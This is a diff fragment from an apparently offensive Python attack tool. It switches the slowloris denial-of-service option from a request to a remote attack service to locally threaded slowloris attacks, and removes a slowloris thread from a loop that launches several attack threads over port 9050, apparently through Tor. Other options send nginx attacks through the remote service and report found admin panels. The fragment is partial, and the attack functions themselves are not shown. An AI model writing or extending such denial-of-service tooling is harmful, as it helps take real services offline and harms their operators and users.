@@ -312,8 +312,7 @@ elif(attack == '3'):
   print(Fore.GREEN + '  Admin panel: ' + admin + '\n')
   exit()
 elif(attack == '4'):
-  data = requests.get(host + '?slowloris&host=' + target +'&req=' + count, headers=headers, proxies=proxies)
-  print(Fore.WHITE + '  Start attack slowloris')
+  threads(slowloris, thread, target, count)
   exit()
 elif(attack == '5'):
   data = requests.get(host + '?nginx&host=' + target +'&req=' + count, headers=headers, proxies=proxies)
@@ -346,26 +345,20 @@ for n in range(int(thread)):
     t1 = threading.Thread(target=attack1, args=(target1, 9050))
     t2 = threading.Thread(target=attack2, args=(target, 9050))
     t3 = threading.Thread(target=attack3, args=(target1, 9050))
-    t4 = threading.Thread(target=slowloris, args=(target1, count))
-
-
 
     t1.daemon = True
     t2.daemon = True
     t3.daemon = True
-    t4.daemon = True
 
 
     t1.start()
     t2.start()
     t3.start()
-    t4.start()
 
 
     threads.append(t1)
     threads.append(t2)
     threads.append(t3)
-    threads.append(t4)
 
 
 
